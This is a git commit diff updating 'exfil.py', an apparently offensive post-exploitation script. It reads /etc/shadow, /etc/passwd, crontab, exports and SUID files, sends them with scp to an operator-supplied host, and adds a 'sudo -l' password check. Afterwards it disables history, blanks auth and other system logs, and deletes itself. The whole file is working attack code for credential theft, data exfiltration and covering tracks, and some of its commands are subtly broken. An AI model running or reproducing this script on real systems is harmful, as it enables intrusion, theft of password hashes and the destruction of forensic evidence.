07f2bf29a7441edc89343b6f1f3038e310177ac3
cysec11 <84633135+cysec11@users.noreply.github.com>
2023-03-26 14:44:11 -0400

    Update exfil.py
    Add functions, passwd input for sudo -l

--- exfil.py
+++ exfil.py
@@ -5,6 +5,7 @@
 # and deleting history/script from target machine.
 
 import os
+import platform
 
 
 def extract_clear():
@@ -20,7 +21,7 @@ def extract_clear():
         local_path = input("local IP and file save path (10.0.0.1/home/file.txt): ")
 
         # disabling history
-        print("disabling history logging...")
+        print("\ndisabling history logging...")
         os.system("unset HISTFILE")
         os.system("export HISTSIZE=0")
         os.system("export HISTFILESIZE=0")
@@ -31,35 +32,43 @@ def extract_clear():
         os.system("cd /tmp/&&mkdir .data&&cd .data&&touch data_exfil.txt")
 
         # write data to file
-        print("exfiltrating data...")
-        print("/etc/passwd:")
+        print("### exfiltrating data... ###")
+
+        print("\n### system info: ###")
+        my_system = platform.uname()
+        print(f"system: {my_system.system}")
+        print(f"node name: {my_system.node}")
+        print(f"release: {my_system.release}")
+        print(f"version: {my_system.version}")
+        print(f"machine: {my_system.machine}")
+        print(f"processor: {my_system.processor}")
+
+        print("\n### /etc/passwd: ###")
         os.system("cat /etc/passwd > /tmp/data_exfil.txt")
         os.system("cat /etc/passwd")
 
-        print("/etc/crontab:")
+        print("\n### /etc/crontab: ###")
         os.system("cat /etc/crontab >> /tmp/data_exfil.txt")
         os.system("cat /etc/crontab")
 
-        print("/etc/shadow:")
+        print("\n### /etc/shadow: ###")
         os.system("cat /etc/shadow >> /tmp/data_exfil.txt")
         os.system("cat /etc/shadow")
 
-        print("/etc/exports:")
+        print("\n### /etc/exports: ###")
         os.system("cat /etc/exports >> /tmp/data_exfil.txt")
         os.system("cat /etc/exports")
 
-        print("SUID files:")
+        print("\n### SUID files: ###")
         os.system("find / type -f perm /4000 2>/dev/null >> /tmp/data_exfil.txt")
         os.system("find / type -f perm /4000 2>/dev/null")
 
-        print("if you know the user's passwd, try sudo -l")
-
         # exfil the data file to local machine
         os.system(f"scp /tmp/data_exfil.txt root@{local_path}]")
-        print(f"data_exfil.txt sent to {local_path}")
+        print(f"\n*** data_exfil.txt sent to {local_path} ***")
 
         # delete logs and this script from target machine
-        print("data exfiltrated... clearing log files")
+        print("\n### data exfiltrated... clearing log files ###")
         os.system("echo ' ' > ~/.bash_history")
         os.system("echo ' ' > /var/log/auth.log")
         os.system("echo ' ' > /var/log/cron.log")
@@ -67,21 +76,37 @@ def extract_clear():
         os.system("echo ' ' > /var/log/httpd")
         os.system("history -c")
         os.system("history -w")
+        exit()
     else:
         print("didn't write yes or no!!!")
         extract_clear()
 
 
+# ask if passwd is know, if yes run sudo -l
+def cred_info():
+    cred = input("do you know user's passwd? (yes/no): ")
+    if cred == "no":
+        exit()
+    elif cred == "yes":
+        passwd = input("passwd: ")
+        print("\n### running sudo -l: ###")
+        os.system(f"timeout -k 3 3 sudo -l -S {passwd}")
+        exit()
+    else:
+        cred_info()
+
+
 def delete_file():
-    print("do you want to delete the data file and this script?")
+    print("\ndo you want to delete the data file and this script?")
     answer_2 = input("(yes/no): ")
     if answer_2 == "no":
         print("good luck!")
         exit()
     elif answer_2 == "yes":
-        print("deleting data file and script...")
+        print("\n### deleting data file and script... ###")
         os.system("rm -rf /tmp/.data")
         os.system("rm exfil.py")
+        exit()
     else:
         print("didn't write yes or no!!!")
         delete_file()
